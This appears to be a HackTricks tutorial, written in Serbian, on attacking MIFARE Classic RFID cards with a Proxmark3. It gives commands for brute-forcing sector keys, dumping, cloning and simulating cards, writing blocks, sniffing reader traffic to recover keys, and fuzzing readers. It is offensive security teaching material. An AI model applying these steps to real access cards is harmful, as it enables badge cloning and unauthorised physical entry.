# Proxmark 3

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? Želite li da vidite **vašu kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pronađite najvažnije ranjivosti kako biste ih brže popravili. Intruder prati vašu površinu napada, pokreće proaktivno skeniranje pretnji, pronalazi probleme u celokupnom tehnološkom sklopu, od API-ja do veb aplikacija i cloud sistema. [**Isprobajte besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Napad na RFID sisteme sa Proxmark3

Prva stvar koju trebate uraditi je da imate [**Proxmark3**](https://proxmark.com) i [**instalirate softver i njegove zavisnosti**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Napad na MIFARE Classic 1KB

Ima **16 sektora**, svaki od njih ima **4 bloka** i svaki blok sadrži **16B**. UID se nalazi u sektoru 0 bloku 0 (i ne može se menjati).\
Da biste pristupili svakom sektoru, potrebne su vam **2 ključa** (**A** i **B**) koji se čuvaju u **bloku 3 svakog sektora** (sektor trailer). Sektor trailer takođe čuva **access bits** koji daju dozvole za **čitanje i pisanje** na **svakom bloku** koristeći 2 ključa.\
2 ključa su korisna za davanje dozvola za čitanje ako znate prvi ključ i pisanje ako znate drugi ključ (na primer).

Mogu se izvesti nekoliko napada
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3 omogućava izvođenje drugih radnji poput **prisluškivanja** komunikacije između **Taga i Čitača** kako bi se pokušalo pronaći osetljive podatke. Na ovoj kartici možete samo presresti komunikaciju i izračunati korišćeni ključ jer su **kriptografske operacije koje se koriste slabe**, pa možete izračunati ključ znajući otvoreni i šifrovani tekst (`mfkey64` alat).

### Sirove Komande

IoT sistemi ponekad koriste **nebrendirane ili nekomercijalne tagove**. U tom slučaju, možete koristiti Proxmark3 da biste poslali prilagođene **sirove komande tagovima**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Sa ovim informacijama možete pokušati da pronađete informacije o kartici i načinu komunikacije sa njom. Proxmark3 omogućava slanje sirovih komandi kao što je: `hf 14a raw -p -b 7 26`

### Skripte

Proxmark3 softver dolazi sa unapred učitanom listom **automatizovanih skripti** koje možete koristiti za obavljanje jednostavnih zadataka. Da biste dobili punu listu, koristite komandu `script list`. Zatim koristite komandu `script run`, praćenu imenom skripte:
```
proxmark3> script run mfkeys
```
Možete napraviti skriptu za **fuzziranje čitača oznaka**, tako da kopirate podatke sa **validne kartice** i napišete **Lua skriptu** koja **randomizuje** jedan ili više **random bajtova** i proverava da li čitač **pada** tokom bilo koje iteracije.

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pronađite najvažnije ranjivosti kako biste ih brže popravili. Intruder prati vašu površinu napada, pokreće proaktivne pretrage pretnji, pronalazi probleme u celokupnom tehnološkom sklopu, od API-ja do veb aplikacija i sistemima u oblaku. [**Isprobajte besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite **vašu kompaniju reklamiranu na HackTricks**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
